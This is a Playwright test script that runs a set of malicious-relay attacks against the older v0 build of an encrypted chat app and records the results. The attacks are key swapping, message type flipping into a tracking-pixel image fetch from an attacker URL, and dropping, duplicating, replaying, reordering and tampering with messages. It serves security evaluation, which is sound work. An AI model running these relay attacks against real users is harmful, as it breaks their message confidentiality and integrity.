/**
 * Malicious-relay attack matrix: the v0 side.
 *
 * Drives the OLD app (tag protocol-v0, served from a scratch copy) through the
 * evil proxy (evaluation/attacks/evil-proxy.mjs), which applies the same relay
 * transforms the v1 backend uses. One attack per invocation (ATTACK env). v0 has
 * no key transparency, so only message/handshake attacks run here; impersonation
 * and BOLA are checked in Node by the runner.
 *
 * v0 has no data-testid attributes, so messages are matched by their text and by
 * the <img alt="Secure shared"> element (the flip_type rendering vector).
 */
import { expect, test, type Browser, type Page } from "@playwright/test";
import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { PASSWORD, newUser as newWatchedUser, toasts as recorded, type User } from "./helpers";

const ATTACK = process.env.ATTACK ?? "flip_type";
const OUT_DIR = process.env.OUT_DIR ?? "test-results/attacks-v0";
const ALICE = process.env.ALICE_NAME ?? "alice_v0";
const BOB = process.env.BOB_NAME ?? "bob_v0";
const MALLORY = process.env.MALLORY_NAME ?? "mallory_v0";
mkdirSync(OUT_DIR, { recursive: true });

const newUser = (browser: Browser, name: string) => newWatchedUser(browser, name, { recordToasts: true });
const toasts = (u: User) => recorded(u, /fail|error|alert|queued|decrypt|mitm|security/i);

async function register(u: User) {
  const { page } = u;
  await page.goto("/");
  await page.getByRole("button", { name: "New here? Establish identity." }).click();
  await page.getByPlaceholder("Enter your alias").fill(u.name);
  await page.getByPlaceholder("Enter your secure password").fill(PASSWORD);
  await page.getByRole("button", { name: "Generate Proofs & Register" }).click();
  // v0 logs in straight after registering (no vault gate).
  await expect(page.getByRole("button", { name: "Active Link" })).toBeVisible({ timeout: 60_000 });
}

async function befriend(a: User, b: User) {
  await a.page.getByRole("button", { name: /^Requests/ }).click();
  await a.page.getByPlaceholder("Search global network...").fill(b.name);
  await a.page.getByRole("button", { name: "Invite" }).click();
  await b.page.getByRole("button", { name: /^Requests/ }).click();
  await b.page.getByRole("button", { name: "Accept" }).first().click();
  await expect(b.page.getByText(`You are now friends with ${a.name}!`)).toBeVisible({ timeout: 20_000 });
}

async function openChat(u: User, peer: string) {
  await u.page.getByRole("button", { name: "Active Link" }).click();
  await u.page.getByRole("button", { name: new RegExp(peer) }).first().click({ timeout: 20_000 });
  await expect(u.page.getByRole("heading", { name: peer })).toBeVisible();
}

async function sendText(u: User, text: string) {
  const input = u.page.getByPlaceholder(/Secure message to/);
  await expect(input).toBeEnabled();
  await input.fill(text);
  await input.press("Enter");
  await u.page.waitForTimeout(600);
}

async function finish(result: Record<string, unknown>, shotPage?: Page) {
  if (shotPage) await shotPage.screenshot({ path: join(OUT_DIR, `${ATTACK}.png`) }).catch(() => {});
  writeFileSync(join(OUT_DIR, `${ATTACK}.json`), JSON.stringify(result, null, 2));
}

test(`v0 attack: ${ATTACK}`, async ({ browser }) => {
  test.setTimeout(240_000);
  const result: Record<string, unknown> = { attack: ATTACK, flavor: "v0", at: new Date().toISOString() };

  const alice = await newUser(browser, ALICE);
  const bob = await newUser(browser, BOB);
  await register(alice);
  await register(bob);
  if (ATTACK === "swap_key") {
    const mallory = await newUser(browser, MALLORY);
    await register(mallory);
    await mallory.context.close();
  }
  await befriend(alice, bob);
  await openChat(alice, bob.name);
  await openChat(bob, alice.name);

  if (ATTACK === "swap_key") {
    await sendText(alice, "hello bob (handshake)");
    await bob.page.waitForTimeout(4000);
    const bobGot = await bob.page.getByText("hello bob (handshake)").count();
    const aliceMitm = await alice.page.getByText(/man-in-the-middle|public key has changed/i).count();
    result.bobReceivedPlaintext = bobGot > 0;
    result.aliceMitmWarning = aliceMitm > 0;
    result.aliceToasts = await toasts(alice);
    result.bobToasts = await toasts(bob);
    result.observed =
      bobGot > 0
        ? "plaintext delivered under swapped key (LEAK)"
        : aliceMitm > 0
          ? "key-change warning shown"
          : "swapped key pinned silently (TOFU), no warning; message undecryptable";
    await finish(result, alice.page);
    await alice.context.close();
    await bob.context.close();
    return;
  }

  // message attacks
  const N = 6;
  const sent: string[] = [];
  for (let i = 0; i < N; i++) {
    const t = `a2b #${i}`;
    sent.push(t);
    await sendText(alice, t);
  }
  // flip_type: a text that is a URL becomes <img src=URL> on Bob's side.
  const proxyUrl = process.env.PROXY_URL;
  if (ATTACK === "flip_type" && proxyUrl) await sendText(alice, `${proxyUrl}/__track.gif?reader=${BOB}`);
  await bob.page.waitForTimeout(3000);
  if (ATTACK === "flip_type" && proxyUrl) {
    const hits = (await (await fetch(`${proxyUrl}/__track-hits`)).json()) as { url: string }[];
    result.trackingPixelHits = hits.length;
    result.trackingPixelUrls = hits.map((h) => h.url);
  }

  let received = 0;
  for (const t of sent) received += (await bob.page.getByText(t, { exact: false }).count()) > 0 ? 1 : 0;
  // flip_type: a text turned into <img alt="Secure shared">.
  const imgCount = await bob.page.locator('img[alt="Secure shared"]').count();

  result.sentTexts = N;
  result.bobTextsReceived = received;
  result.bobImgElements = imgCount;
  result.bobToasts = await toasts(bob);
  result.textRenderedAsImage = ATTACK === "flip_type" ? imgCount : 0;

  let observed: string;
  if (ATTACK === "flip_type")
    observed =
      imgCount > 0
        ? `text rendered as <img> (${imgCount}); Bob's browser fetched the attacker URL ${result.trackingPixelHits ?? 0}x (tracking pixel, no AAD)`
        : `no img rendered (received ${received}/${N} as text)`;
  else if (ATTACK === "drop") observed = `received ${received}/${N} (dropped messages also desync the shared ratchet)`;
  else if (ATTACK === "duplicate") observed = `received-distinct ${received}/${N}; duplicates re-fed to the single ratchet`;
  else if (ATTACK === "replay") observed = `received ${received}/${N}; v0 has no replay/duplicate protection`;
  else if (ATTACK === "reorder") observed = `received ${received}/${N}; reordering breaks the order-dependent ratchet`;
  else if (ATTACK === "tamper") observed = `received ${received}/${N}; AES-CBC static-IV, tamper -> decrypt failure`;
  else observed = `received ${received}/${N}`;
  result.observed = observed;
  await finish(result, bob.page);
  await alice.context.close();
  await bob.context.close();
});
